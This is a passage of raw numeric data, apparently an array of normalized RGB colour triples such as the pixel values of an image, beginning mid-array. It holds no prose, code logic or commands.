,0.365,0.318},{0.161,0.106,0.137},{0.067,0.02,0.031},{0.051,0.012,0.024},{0.024,0.012,0.016},{0,0,0},{0.004,0,0},{0,0,0},{0,0,0},{0.098,0.043,0.027},{0.271,0.106,0.051},
{0.235,0.082,0.035},{0.235,0.075,0.027},{0.302,0.118,0.063},{0.404,0.18,0.118},{0.529,0.267,0.196},{0.639,0.357,0.267},{0.694,0.408,0.318},{0.784,0.529,0.459},{0.859,0.635,0.592},{0.753,0.518,0.447},{0.769,0.533,0.416},{0.808,0.576,0.455},{0.839,0.604,0.478},{0.859,0.624,0.494},{0.878,0.643,0.522},{0.886,0.647,0.529},{0.886,0.647,0.525},{0.898,0.663,0.545},{0.894,0.659,0.541},{0.898,0.663,0.549},{0.902,0.671,0.553},{0.906,0.675,0.557},{0.906,0.678,0.561},{0.902,0.663,0.545},{0.906,0.671,0.545},{0.906,0.671,0.545},{0.898,0.663,0.537},{0.894,0.651,0.522},{0.898,0.655,0.525},{0.89,0.647,0.518},{0.882,0.639,0.51},{0.882,0.639,0.51},{0.867,0.62,0.49},{0.859,0.612,0.482},{0.851,0.6,0.471},{0.847,0.682,0.631},{0.816,0.702,0.706},{0.827,0.729,0.733},{0.827,0.729,0.733},{0.863,0.749,0.761},{0.69,0.573,0.58},{0.69,0.573,0.58},{0.678,0.561,0.565},{0.706,0.588,0.596},{0.741,0.639,0.647},{0.737,0.631,0.639},{0.706,0.588,0.596},{0.651,0.525,0.522},{0.635,0.51,0.502},{0.651,0.525,0.518},{0.647,0.522,0.514},{0.651,0.522,0.514},{0.651,0.518,0.514},
{0.659,0.525,0.518},{0.659,0.525,0.518},{0.671,0.537,0.529},{0.686,0.565,0.557},{0.678,0.553,0.541},{0.678,0.553,0.545},{0.675,0.545,0.541},{0.667,0.537,0.529},{0.671,0.537,0.529},{0.682,0.553,0.545},{0.678,0.545,0.537},{0.69,0.569,0.557},{0.698,0.569,0.561},{0.706,0.584,0.576},{0.714,0.592,0.584},{0.733,0.616,0.608},{0.733,0.616,0.608},{0.745,0.627,0.62},{0.749,0.631,0.624},{0.737,0.62,0.612},{0.725,0.608,0.6},{0.714,0.592,0.58},{0.702,0.576,0.565},{0.69,0.549,0.529},{0.729,0.502,0.431},{0.804,0.545,0.427},{0.867,0.635,0.518},{0.882,0.667,0.545},{0.902,0.69,0.561},{0.91,0.702,0.58},{0.914,0.714,0.592},{0.922,0.718,0.596},{0.918,0.71,0.588},{0.91,0.702,0.58},{0.894,0.682,0.561},{0.878,0.659,0.537},{0.808,0.592,0.471},{0.306,0.192,0.173},{0.082,0.035,0.051},{0.024,0.008,0.008},{0.004,0.004,0.004},{0,0,0},{0.004,0,0.004},{0.004,0.004,0.004},{0.012,0.004,0.004},{0.247,0.11,0.059},{0.282,0.11,0.059},{0.361,0.165,0.11},{0.522,0.278,0.208},{0.616,0.345,0.263},{0.702,0.42,0.333},{0.753,0.467,0.376},{0.788,0.506,0.42},
{0.827,0.557,0.475},{0.863,0.631,0.573},{0.8,0.573,0.518},{0.745,0.51,0.408},{0.796,0.557,0.435},{0.824,0.584,0.455},{0.855,0.62,0.498},{0.871,0.639,0.518},{0.882,0.659,0.533},{0.902,0.671,0.553},{0.906,0.675,0.557},{0.906,0.675,0.553},{0.91,0.671,0.553},{0.914,0.678,0.565},{0.914,0.69,0.573},{0.922,0.694,0.58},{0.922,0.698,0.58},{0.925,0.698,0.584},{0.922,0.694,0.576},{0.918,0.69,0.573},{0.918,0.69,0.573},{0.914,0.682,0.561},{0.91,0.675,0.549},{0.906,0.667,0.545},{0.898,0.667,0.545},{0.89,0.655,0.533},{0.882,0.647,0.518},{0.878,0.639,0.506},{0.871,0.631,0.506},{0.867,0.694,0.631},{0.82,0.706,0.706},{0.808,0.698,0.706},{0.82,0.718,0.729},{0.859,0.749,0.757},{0.698,0.58,0.588},{0.698,0.58,0.588},{0.675,0.553,0.561},{0.682,0.565,0.573},{0.682,0.565,0.573},{0.698,0.58,0.588},{0.71,0.592,0.6},{0.671,0.549,0.545},{0.647,0.525,0.518},{0.643,0.522,0.514},{0.639,0.51,0.502},{0.639,0.506,0.502},{0.643,0.51,0.502},{0.655,0.522,0.514},{0.655,0.518,0.51},{0.663,0.529,0.525},{0.675,0.541,0.537},{0.675,0.545,0.541},{0.667,0.533,0.525},
{0.659,0.522,0.518},{0.659,0.522,0.514},{0.671,0.537,0.529},{0.675,0.541,0.533},{0.682,0.549,0.541},{0.69,0.565,0.553},{0.694,0.569,0.557},{0.714,0.592,0.584},{0.714,0.592,0.584},{0.718,0.596,0.588},{0.725,0.608,0.6},{0.725,0.608,0.6},{0.733,0.616,0.608},{0.741,0.624,0.616},{0.729,0.608,0.6},{0.714,0.592,0.584},{0.698,0.573,0.561},{0.69,0.557,0.549},{0.686,0.545,0.537},{0.714,0.525,0.478},{0.812,0.569,0.467},{0.863,0.635,0.514},{0.878,0.671,0.545},{0.894,0.682,0.561},{0.902,0.69,0.569},{0.906,0.69,0.565},{0.902,0.682,0.565},{0.894,0.667,0.549},{0.878,0.651,0.529},{0.808,0.576,0.459},{0.608,0.353,0.251},{0.314,0.102,0.063},{0.114,0.035,0.027},{0.075,0.016,0.008},{0.086,0.012,0.008},{0.106,0.016,0.008},{0.192,0.071,0.055},{0.275,0.114,0.094},{0.333,0.149,0.11},{0.463,0.224,0.157},{0.565,0.306,0.231},{0.682,0.424,0.337},{0.765,0.51,0.42},{0.804,0.561,0.471},{0.831,0.588,0.506},{0.847,0.604,0.525},{0.851,0.616,0.537},{0.859,0.635,0.576},{0.788,0.545,0.49},{0.71,0.459,0.369},{0.769,0.529,0.408},{0.812,0.576,0.455},{0.843,0.612,0.482},
{0.863,0.635,0.514},{0.878,0.663,0.537},{0.898,0.671,0.545},{0.906,0.682,0.557},{0.918,0.702,0.588},{0.918,0.694,0.58},{0.922,0.694,0.584},{0.925,0.702,0.592},{0.929,0.702,0.588},{0.933,0.71,0.604},{0.929,0.698,0.588},{0.937,0.71,0.596},{0.929,0.702,0.588},{0.929,0.706,0.592},{0.929,0.71,0.592},{0.933,0.706,0.588},{0.922,0.702,0.58},{0.914,0.69,0.569},{0.906,0.678,0.557},{0.902,0.667,0.537},{0.902,0.667,0.541},{0.894,0.651,0.525},{0.886,0.643,0.514},{0.878,0.698,0.62},{0.831,0.718,0.714},{0.808,0.694,0.706},{0.816,0.706,0.718},{0.843,0.729,0.741},{0.702,0.584,0.596},{0.702,0.584,0.596},{0.69,0.573,0.58},{0.682,0.565,0.573},{0.682,0.565,0.573},{0.682,0.561,0.569},{0.675,0.553,0.557},{0.647,0.525,0.518},{0.631,0.51,0.502},{0.639,0.518,0.51},{0.639,0.51,0.502},{0.655,0.533,0.525},{0.651,0.525,0.522},{0.647,0.525,0.518},{0.651,0.518,0.51},{0.647,0.518,0.514},{0.667,0.537,0.529},{0.659,0.529,0.525},{0.659,0.525,0.518},{0.663,0.529,0.522},{0.667,0.537,0.529},{0.678,0.549,0.541},{0.686,0.565,0.557},{0.706,0.584,0.576},{0.706,0.588,0.576},
{0.686,0.565,0.557},{0.714,0.592,0.584},{0.722,0.604,0.596},{0.722,0.604,0.596},{0.725,0.608,0.6},{0.737,0.62,0.612},{0.733,0.616,0.608},{0.725,0.608,0.6},{0.71,0.588,0.58},{0.702,0.58,0.569},{0.702,0.58,0.569},{0.714,0.596,0.584},{0.714,0.588,0.58},{0.702,0.573,0.565},{0.71,0.561,0.541},{0.765,0.573,0.506},{0.831,0.612,0.502},{0.871,0.643,0.522},{0.875,0.639,0.514},{0.878,0.639,0.518},{0.875,0.635,0.51},{0.847,0.608,0.478},{0.733,0.478,0.357},{0.553,0.278,0.176},{0.463,0.208,0.125},{0.439,0.212,0.133},{0.384,0.18,0.106},{0.396,0.192,0.11},{0.467,0.251,0.157},{0.529,0.294,0.22},{0.565,0.302,0.231},{0.569,0.31,0.231},{0.62,0.357,0.271},{0.686,0.427,0.341},{0.745,0.498,0.412},{0.792,0.561,0.475},{0.831,0.588,0.51},{0.851,0.616,0.541},{0.863,0.643,0.569},{0.863,0.635,0.561},{0.847,0.612,0.541},{0.776,0.522,0.455},{0.678,0.431,0.345},{0.765,0.529,0.412},{0.808,0.576,0.455},{0.824,0.584,0.463},{0.843,0.612,0.49},{0.863,0.635,0.518},{0.878,0.667,0.545},{0.898,0.678,0.565},{0.918,0.706,0.588},{0.925,0.71,0.592},{0.929,0.71,0.596},
{0.941,0.729,0.616},{0.941,0.722,0.612},{0.937,0.718,0.604},{0.945,0.718,0.612},{0.949,0.729,0.627},{0.945,0.725,0.616},{0.941,0.718,0.608},{0.941,0.725,0.612},{0.941,0.725,0.616},{0.937,0.725,0.608},{0.929,0.71,0.596},{0.929,0.71,0.592},{0.929,0.702,0.584},{0.922,0.694,0.573},{0.922,0.69,0.573},{0.906,0.667,0.545},{0.902,0.667,0.545},{0.89,0.698,0.612},{0.847,0.733,0.729},{0.808,0.694,0.706},{0.82,0.706,0.722},{0.831,0.718,0.729},{0.71,0.596,0.608},{0.71,0.596,0.608},{0.686,0.569,0.576},{0.682,0.565,0.569},{0.682,0.565,0.573},{0.675,0.553,0.561},{0.659,0.533,0.545},{0.655,0.533,0.533},{0.651,0.529,0.525},{0.651,0.529,0.525},{0.655,0.533,0.525},{0.663,0.541,0.533},{0.655,0.529,0.522},{0.659,0.529,0.525},{0.659,0.529,0.525},{0.659,0.529,0.522},{0.659,0.529,0.522},{0.659,0.529,0.525},{0.663,0.533,0.525},{0.667,0.541,0.533},{0.678,0.553,0.549},{0.671,0.545,0.537},{0.678,0.557,0.549},{0.698,0.576,0.569},{0.698,0.576,0.569},{0.706,0.584,0.576},{0.729,0.612,0.604},{0.729,0.612,0.604},{0.722,0.6,0.592},{0.729,0.612,0.604},{0.733,0.616,0.608},
{0.737,0.62,0.612},{0.729,0.612,0.604},{0.722,0.604,0.596},{0.714,0.596,0.584},{0.714,0.596,0.588},{0.722,0.604,0.596},{0.729,0.612,0.604},{0.718,0.596,0.588},{0.71,0.588,0.576},{0.702,0.576,0.565},{0.702,0.565,0.545},{0.753,0.58,0.498},{0.796,0.573,0.447},{0.788,0.545,0.42},{0.776,0.529,0.404},{0.698,0.431,0.31},{0.596,0.325,0.212},{0.576,0.318,0.208},{0.569,0.322,0.208},{0.596,0.341,0.212},{0.608,0.353,0.227},{0.58,0.337,0.243},{0.612,0.365,0.294},{0.663,0.416,0.337},{0.698,0.443,0.357},{0.714,0.455,0.365},{0.725,0.467,0.384},{0.741,0.482,0.404},{0.765,0.51,0.431},{0.784,0.529,0.451},{0.796,0.545,0.478},{0.788,0.545,0.478},{0.769,0.522,0.455},{0.698,0.435,0.373},{0.537,0.278,0.227},{0.498,0.243,0.169},{0.663,0.408,0.302},{0.761,0.529,0.412},{0.816,0.6,0.478},{0.835,0.616,0.486},{0.847,0.624,0.502},{0.863,0.647,0.529},{0.878,0.663,0.545},{0.894,0.682,0.569},{0.914,0.698,0.588},{0.922,0.71,0.588},{0.933,0.722,0.608},{0.933,0.714,0.6},{0.941,0.718,0.604},{0.945,0.722,0.608},{0.949,0.737,0.627},{0.961,0.749,0.643},{0.957,0.741,0.643},
{0.957,0.745,0.647},{0.957,0.745,0.639},{0.957,0.749,0.643},{0.953,0.745,0.639},{0.945,0.737,0.627},{0.949,0.733,0.627},{0.945,0.733,0.612},{0.933,0.718,0.604},{0.929,0.706,0.592},{0.922,0.686,0.573},{0.91,0.682,0.561},{0.902,0.698,0.604},{0.867,0.753,0.749},{0.816,0.702,0.714},{0.82,0.706,0.722},{0.835,0.722,0.729},{0.718,0.612,0.627},{0.718,0.612,0.627},{0.702,0.584,0.592},{0.698,0.584,0.588},{0.686,0.569,0.576},{0.686,0.569,0.576},{0.671,0.549,0.557},{0.671,0.553,0.557},{0.671,0.549,0.557},{0.663,0.537,0.537},{0.659,0.537,0.529},{0.655,0.533,0.525},{0.655,0.525,0.522},{0.655,0.522,0.518},{0.651,0.522,0.518},{0.655,0.525,0.518},{0.651,0.514,0.51},{0.659,0.525,0.522},{0.667,0.537,0.533},{0.667,0.545,0.537},{0.667,0.537,0.529},{0.671,0.541,0.537},{0.694,0.573,0.565},{0.69,0.569,0.561},{0.694,0.573,0.565},{0.714,0.596,0.592},{0.729,0.612,0.604},{0.71,0.588,0.58},{0.718,0.6,0.596},{0.733,0.616,0.612},{0.741,0.624,0.616},{0.741,0.624,0.616},{0.733,0.616,0.608},{0.706,0.584,0.576},{0.698,0.576,0.569},{0.71,0.588,0.58},{0.733,0.616,0.608},
{0.733,0.616,0.608},{0.714,0.596,0.584},{0.706,0.588,0.576},{0.71,0.588,0.58},{0.702,0.58,0.569},{0.706,0.569,0.533},{0.725,0.533,0.4},{0.651,0.424,0.271},{0.663,0.42,0.306},{0.631,0.373,0.243},{0.624,0.361,0.231},{0.608,0.345,0.216},{0.576,0.325,0.212},{0.549,0.318,0.224},{0.576,0.345,0.271},{0.635,0.388,0.31},{0.667,0.42,0.341},{0.69,0.443,0.357},{0.706,0.455,0.373},{0.702,0.439,0.361},{0.698,0.435,0.361},{0.698,0.439,0.369},{0.667,0.404,0.345},{0.592,0.325,0.278},{0.498,0.247,0.208},{0.408,0.165,0.137},{0.282,0.09,0.071},{0.137,0.027,0.016},{0.184,0.024,0.008},{0.38,0.149,0.082},{0.537,0.294,0.2},{0.659,0.412,0.306},{0.745,0.51,0.396},{0.804,0.588,0.467},{0.831,0.62,0.498},{0.855,0.643,0.529},{0.859,0.647,0.529},{0.871,0.651,0.537},{0.89,0.675,0.557},{0.914,0.69,0.573},{0.933,0.725,0.612},{0.941,0.729,0.616},{0.949,0.737,0.62},{0.949,0.733,0.624},{0.961,0.757,0.643},{0.969,0.757,0.655},{0.973,0.769,0.671},{0.976,0.78,0.682},{0.969,0.769,0.663},{0.969,0.769,0.667},{0.965,0.765,0.663},{0.961,0.757,0.655},{0.957,0.757,0.647},
{0.957,0.749,0.643},{0.953,0.745,0.639},{0.945,0.729,0.627},{0.937,0.722,0.612},{0.929,0.71,0.596},{0.914,0.694,0.588},{0.875,0.757,0.749},{0.827,0.718,0.725},{0.816,0.702,0.714},{0.835,0.722,0.729},{0.718,0.612,0.627},{0.718,0.612,0.627},{0.706,0.592,0.604},{0.702,0.588,0.596},{0.698,0.58,0.588},{0.694,0.576,0.584},{0.659,0.537,0.545},{0.667,0.545,0.553},{0.659,0.533,0.545},{0.659,0.533,0.537},{0.659,0.537,0.533},{0.655,0.533,0.525},{0.651,0.529,0.522},{0.655,0.525,0.525},{0.647,0.522,0.518},{0.659,0.533,0.525},{0.651,0.518,0.514},{0.659,0.522,0.518},{0.659,0.525,0.522},{0.659,0.525,0.525},{0.663,0.533,0.529},{0.663,0.533,0.529},{0.678,0.557,0.545},{0.698,0.576,0.569},{0.698,0.576,0.569},{0.706,0.584,0.58},{0.71,0.588,0.58},{0.725,0.608,0.6},{0.725,0.608,0.604},{0.737,0.62,0.616},{0.733,0.612,0.604},{0.714,0.592,0.584},{0.714,0.592,0.584},{0.71,0.588,0.58},{0.725,0.608,0.6},{0.741,0.627,0.62},{0.749,0.631,0.624},{0.741,0.627,0.62},{0.729,0.612,0.604},{0.714,0.592,0.576},{0.718,0.596,0.58},{0.71,0.584,0.573},{0.678,0.514,0.463},
{0.675,0.443,0.322},{0.639,0.384,0.247},{0.612,0.357,0.224},{0.584,0.329,0.204},{0.557,0.318,0.208},{0.533,0.314,0.224},{0.561,0.337,0.255},{0.608,0.373,0.286},{0.647,0.408,0.314},{0.659,0.416,0.337},{0.663,0.42,0.341},{0.647,0.396,0.322},{0.608,0.345,0.275},{0.549,0.278,0.216},{0.471,0.192,0.145},{0.376,0.11,0.075},{0.294,0.047,0.024},{0.224,0.012,0.008},{0.18,0.008,0.008},{0.102,0.004,0.004},{0.063,0.004,0.004},{0.118,0.004,0.004},{0.184,0.008,0.008},{0.235,0.031,0.012},{0.31,0.086,0.039},{0.427,0.188,0.122},{0.533,0.29,0.204},{0.624,0.384,0.286},{0.702,0.467,0.357},{0.757,0.518,0.412},{0.796,0.573,0.451},{0.824,0.6,0.478},{0.851,0.627,0.506},{0.882,0.667,0.549},{0.922,0.702,0.584},{0.941,0.725,0.612},{0.957,0.745,0.635},{0.961,0.753,0.635},{0.969,0.761,0.655},{0.976,0.776,0.667},{0.973,0.78,0.675},{0.976,0.776,0.678},{0.976,0.776,0.671},{0.973,0.773,0.663},{0.976,0.773,0.671},{0.973,0.776,0.675},{0.969,0.773,0.675},{0.965,0.769,0.667},{0.961,0.765,0.659},{0.957,0.753,0.651},{0.953,0.745,0.639},{0.945,0.725,0.616},{0.937,0.714,0.608},
{0.894,0.761,0.729},{0.855,0.741,0.745},{0.82,0.706,0.718},{0.827,0.714,0.722},{0.722,0.624,0.635},{0.722,0.624,0.635},{0.702,0.584,0.6},{0.698,0.584,0.592},{0.694,0.576,0.584},{0.675,0.557,0.565},{0.663,0.537,0.549},{0.659,0.533,0.545},{0.667,0.541,0.553},{0.671,0.553,0.561},{0.671,0.549,0.553},{0.659,0.533,0.537},{0.647,0.522,0.522},{0.643,0.518,0.51},{0.651,0.529,0.522},{0.651,0.529,0.529},{0.659,0.525,0.522},{0.651,0.518,0.514},{0.651,0.518,0.514},{0.663,0.529,0.525},{0.655,0.522,0.518},{0.659,0.522,0.518},{0.675,0.541,0.533},{0.675,0.545,0.541},{0.69,0.573,0.565},{0.714,0.596,0.588},{0.725,0.608,0.604},{0.718,0.596,0.592},{0.718,0.6,0.596},{0.706,0.584,0.576},{0.69,0.565,0.561},{0.714,0.592,0.584},{0.733,0.616,0.612},{0.745,0.627,0.624},{0.737,0.62,0.62},{0.757,0.639,0.643},{0.757,0.643,0.647},{0.757,0.643,0.635},{0.745,0.627,0.62},{0.745,0.627,0.62},{0.718,0.576,0.545},{0.686,0.471,0.369},{0.651,0.396,0.263},{0.616,0.361,0.235},{0.588,0.333,0.212},{0.549,0.318,0.212},{0.533,0.314,0.227},{0.549,0.329,0.247},{0.596,0.365,0.278},
{0.631,0.396,0.306},{0.651,0.412,0.314},{0.663,0.424,0.337},{0.647,0.408,0.325},{0.616,0.373,0.29},{0.584,0.337,0.263},{0.561,0.314,0.239},{0.537,0.286,0.216},{0.529,0.271,0.2},{0.514,0.255,0.184},{0.494,0.235,0.173},{0.447,0.204,0.149},{0.388,0.176,0.133},{0.306,0.141,0.11},{0.243,0.086,0.063},{0.192,0.031,0.024},{0.196,0.012,0.008},{0.212,0.024,0.008},{0.227,0.027,0.012},{0.247,0.035,0.012},{0.278,0.059,0.024},{0.325,0.098,0.047},{0.404,0.165,0.098},{0.486,0.239,0.161},{0.573,0.325,0.231},{0.651,0.408,0.302},{0.733,0.494,0.384},{0.808,0.58,0.467},{0.871,0.647,0.533},{0.922,0.71,0.596},{0.949,0.741,0.639},{0.957,0.753,0.635},{0.965,0.761,0.655},{0.973,0.769,0.655},{0.973,0.769,0.667},{0.973,0.769,0.667},{0.976,0.78,0.675},{0.976,0.784,0.678},{0.976,0.784,0.682},{0.98,0.784,0.686},{0.976,0.788,0.686},{0.976,0.792,0.694},{0.973,0.776,0.678},{0.973,0.776,0.678},{0.973,0.773,0.671},{0.961,0.753,0.655},{0.949,0.737,0.635},{0.91,0.745,0.694},{0.867,0.753,0.757},{0.835,0.722,0.725},{0.824,0.71,0.722},{0.686,0.569,0.58},{0.686,0.569,0.58},
{0.682,0.565,0.573},{0.69,0.569,0.58},{0.675,0.557,0.565},{0.663,0.541,0.553},{0.663,0.541,0.549},{0.655,0.529,0.541},{0.651,0.529,0.537},{0.667,0.545,0.557},{0.678,0.553,0.565},{0.663,0.545,0.545},{0.659,0.529,0.541},{0.663,0.537,0.541},{0.663,0.537,0.545},{0.655,0.529,0.533},{0.651,0.525,0.522},{0.651,0.525,0.525},{0.655,0.518,0.518},{0.659,0.525,0.522},{0.655,0.522,0.518},{0.678,0.553,0.553},{0.675,0.549,0.549},{0.678,0.553,0.545},{0.702,0.576,0.58},{0.741,0.624,0.631},{0.745,0.627,0.631},{0.733,0.616,0.616},{0.71,0.592,0.588},{0.718,0.6,0.6},{0.725,0.608,0.6},{0.725,0.608,0.604},{0.714,0.596,0.588},{0.718,0.6,0.592},{0.71,0.592,0.584},{0.702,0.576,0.569},{0.694,0.569,0.561},{0.706,0.58,0.573},{0.702,0.576,0.569},{0.694,0.549,0.518},{0.671,0.443,0.329},{0.635,0.392,0.263},{0.616,0.373,0.251},{0.565,0.325,0.224},{0.541,0.318,0.231},{0.561,0.333,0.251},{0.592,0.357,0.271},{0.627,0.388,0.294},{0.651,0.412,0.31},{0.663,0.431,0.322},{0.671,0.443,0.345},{0.671,0.451,0.361},{0.675,0.451,0.361},{0.675,0.455,0.365},{0.675,0.451,0.373},
{0.667,0.427,0.353},{0.651,0.408,0.333},{0.627,0.388,0.31},{0.608,0.373,0.294},{0.58,0.341,0.263},{0.553,0.306,0.231},{0.549,0.294,0.224},{0.553,0.286,0.22},{0.557,0.278,0.216},{0.541,0.259,0.196},{0.506,0.227,0.165},{0.396,0.149,0.102},{0.278,0.067,0.035},{0.216,0.02,0.008},{0.224,0.024,0.012},{0.227,0.027,0.012},{0.247,0.035,0.012},{0.259,0.043,0.012},{0.286,0.063,0.02},{0.333,0.094,0.043},{0.404,0.157,0.094},{0.525,0.267,0.18},{0.675,0.427,0.322},{0.792,0.561,0.451},{0.878,0.659,0.553},{0.922,0.718,0.608},{0.945,0.737,0.635},{0.953,0.757,0.647},{0.957,0.753,0.643},{0.969,0.769,0.659},{0.973,0.776,0.671},{0.976,0.784,0.678},{0.984,0.788,0.682},{0.98,0.784,0.678},{0.98,0.796,0.694},{0.98,0.788,0.694},{0.98,0.792,0.698},{0.976,0.792,0.702},{0.976,0.78,0.686},{0.969,0.765,0.675},{0.957,0.745,0.659},{0.933,0.745,0.671},{0.871,0.761,0.757},{0.855,0.741,0.749},{0.835,0.722,0.729},{0.682,0.561,0.573},{0.682,0.561,0.573},{0.675,0.557,0.565},{0.675,0.557,0.569},{0.667,0.545,0.557},{0.655,0.533,0.541},{0.651,0.525,0.537},{0.651,0.525,0.533},
{0.655,0.529,0.537},{0.659,0.533,0.545},{0.663,0.537,0.549},{0.667,0.541,0.553},{0.667,0.545,0.553},{0.659,0.533,0.545},{0.667,0.541,0.549},{0.663,0.537,0.545},{0.655,0.525,0.529},{0.655,0.533,0.533},{0.659,0.529,0.533},{0.663,0.529,0.525},{0.667,0.545,0.545},{0.702,0.58,0.584},{0.71,0.592,0.6},{0.714,0.596,0.6},{0.71,0.592,0.596},{0.753,0.639,0.643},{0.741,0.624,0.627},{0.741,0.627,0.631},{0.737,0.62,0.624},{0.741,0.627,0.631},{0.753,0.635,0.643},{0.745,0.631,0.631},{0.737,0.62,0.62},{0.722,0.6,0.596},{0.706,0.584,0.576},{0.698,0.573,0.565},{0.682,0.553,0.545},{0.675,0.541,0.533},{0.643,0.506,0.482},{0.573,0.392,0.314},{0.494,0.318,0.235},{0.604,0.388,0.294},{0.541,0.325,0.239},{0.545,0.325,0.239},{0.588,0.357,0.259},{0.616,0.38,0.278},{0.639,0.4,0.302},{0.651,0.416,0.31},{0.655,0.42,0.31},{0.663,0.424,0.322},{0.659,0.439,0.337},{0.678,0.455,0.357},{0.698,0.482,0.384},{0.706,0.49,0.396},{0.718,0.49,0.408},{0.718,0.482,0.4},{0.706,0.471,0.388},{0.698,0.463,0.38},{0.682,0.447,0.369},{0.671,0.424,0.341},{0.675,0.427,0.345},
{0.663,0.392,0.314},{0.655,0.384,0.298},{0.635,0.361,0.275},{0.6,0.329,0.255},{0.557,0.282,0.216},{0.533,0.259,0.188},{0.525,0.247,0.184},{0.459,0.192,0.141},{0.376,0.137,0.098},{0.337,0.102,0.071},{0.29,0.063,0.039},{0.239,0.031,0.016},{0.239,0.031,0.012},{0.247,0.035,0.012},{0.259,0.039,0.012},{0.271,0.043,0.012},{0.314,0.063,0.027},{0.376,0.114,0.063},{0.467,0.192,0.129},{0.525,0.251,0.176},{0.573,0.298,0.22},{0.616,0.345,0.259},{0.647,0.369,0.286},{0.667,0.388,0.302},{0.71,0.431,0.337},{0.776,0.51,0.412},{0.867,0.631,0.525},{0.949,0.753,0.643},{0.976,0.788,0.682},{0.984,0.796,0.698},{0.98,0.8,0.706},{0.98,0.8,0.71},{0.98,0.8,0.706},{0.976,0.788,0.698},{0.965,0.769,0.678},{0.953,0.749,0.663},{0.894,0.769,0.753},{0.859,0.749,0.749},{0.847,0.733,0.741},{0.682,0.561,0.58},{0.682,0.561,0.58},{0.682,0.561,0.573},{0.678,0.561,0.569},{0.667,0.549,0.557},{0.663,0.541,0.553},{0.663,0.537,0.549},{0.655,0.533,0.541},{0.659,0.537,0.545},{0.659,0.537,0.545},{0.675,0.553,0.561},{0.682,0.561,0.569},{0.671,0.549,0.557},{0.659,0.533,0.545},
{0.655,0.533,0.541},{0.655,0.529,0.533},{0.651,0.525,0.533},{0.667,0.541,0.549},{0.659,0.537,0.533},{0.667,0.545,0.541},{0.678,0.557,0.561},{0.706,0.588,0.596},{0.714,0.596,0.604},{0.737,0.624,0.631},{0.745,0.631,0.635},{0.737,0.624,0.627},{0.729,0.616,0.62},{0.737,0.624,0.631},{0.745,0.627,0.635},{0.765,0.651,0.659},{0.769,0.659,0.663},{0.761,0.647,0.651},{0.753,0.639,0.639},{0.737,0.62,0.62},{0.741,0.624,0.624},{0.686,0.573,0.557},{0.608,0.482,0.447},{0.553,0.408,0.369},{0.435,0.263,0.196},{0.49,0.282,0.204},{0.514,0.298,0.216},{0.533,0.31,0.22},{0.561,0.329,0.231},{0.588,0.349,0.247},{0.627,0.384,0.278},{0.655,0.408,0.302},{0.671,0.435,0.322},{0.667,0.427,0.314},{0.675,0.439,0.329},{0.675,0.447,0.337},{0.69,0.467,0.365},{0.714,0.494,0.388},{0.729,0.506,0.404},{0.737,0.51,0.412},{0.749,0.525,0.427},{0.761,0.529,0.435},{0.765,0.525,0.443},{0.769,0.533,0.451},{0.773,0.529,0.447},{0.753,0.514,0.427},{0.733,0.478,0.392},{0.722,0.455,0.365},{0.718,0.451,0.357},{0.706,0.443,0.349},{0.69,0.431,0.345},{0.639,0.369,0.282},{0.604,0.325,0.247},
{0.576,0.31,0.239},{0.573,0.298,0.224},{0.557,0.278,0.212},{0.529,0.251,0.188},{0.514,0.227,0.169},{0.502,0.224,0.161},{0.463,0.192,0.137},{0.471,0.196,0.141},{0.482,0.204,0.145},{0.494,0.212,0.149},{0.514,0.227,0.161},{0.533,0.231,0.169},{0.537,0.239,0.165},{0.553,0.251,0.176},{0.576,0.275,0.2},{0.635,0.322,0.239},{0.663,0.329,0.247},{0.69,0.337,0.263},{0.733,0.388,0.314},{0.725,0.4,0.306},{0.682,0.345,0.239},{0.655,0.322,0.208},{0.725,0.435,0.337},{0.871,0.639,0.537},{0.976,0.792,0.698},{0.98,0.808,0.714},{0.984,0.812,0.722},{0.984,0.796,0.706},{0.973,0.776,0.686},{0.965,0.761,0.671},{0.922,0.761,0.706},{0.863,0.749,0.749},{0.855,0.741,0.745},{0.686,0.565,0.58},{0.686,0.565,0.58},{0.69,0.569,0.584},{0.694,0.576,0.592},{0.694,0.576,0.588},{0.686,0.569,0.58},{0.69,0.573,0.584},{0.667,0.549,0.557},{0.663,0.541,0.549},{0.659,0.537,0.549},{0.659,0.541,0.549},{0.663,0.537,0.549},{0.667,0.541,0.553},{0.675,0.553,0.561},{0.667,0.545,0.553},{0.667,0.541,0.553},{0.663,0.533,0.545},{0.682,0.557,0.569},{0.698,0.58,0.588},{0.698,0.58,0.588},
{0.718,0.604,0.612},{0.725,0.616,0.62},{0.733,0.616,0.624},{0.733,0.62,0.627},{0.733,0.616,0.62},{0.725,0.608,0.616},{0.71,0.592,0.596},{0.714,0.596,0.6},{0.741,0.627,0.635},{0.745,0.631,0.639},{0.757,0.643,0.655},{0.757,0.643,0.647},{0.749,0.635,0.635},{0.753,0.639,0.647},{0.745,0.631,0.631},{0.722,0.639,0.616},{0.549,0.373,0.306},{0.537,0.314,0.235},{0.545,0.31,0.227},{0.561,0.325,0.235},{0.584,0.345,0.247},{0.604,0.357,0.259},{0.616,0.376,0.271},{0.631,0.392,0.282},{0.647,0.416,0.302},{0.667,0.435,0.322},{0.678,0.439,0.329},{0.698,0.451,0.341},{0.714,0.475,0.365},{0.725,0.486,0.376},{0.741,0.506,0.396},{0.753,0.518,0.404},{0.769,0.537,0.427},{0.773,0.541,0.435},{0.784,0.549,0.447},{0.792,0.553,0.459},{0.792,0.553,0.459},{0.792,0.541,0.447},{0.761,0.49,0.396},{0.753,0.478,0.384},{0.78,0.498,0.404},{0.792,0.494,0.404},{0.796,0.506,0.408},{0.8,0.533,0.431},{0.796,0.537,0.435},{0.773,0.51,0.408},{0.745,0.463,0.369},{0.741,0.455,0.369},{0.737,0.459,0.369},{0.718,0.447,0.361},{0.671,0.396,0.322},{0.631,0.353,0.278},{0.612,0.325,0.251},
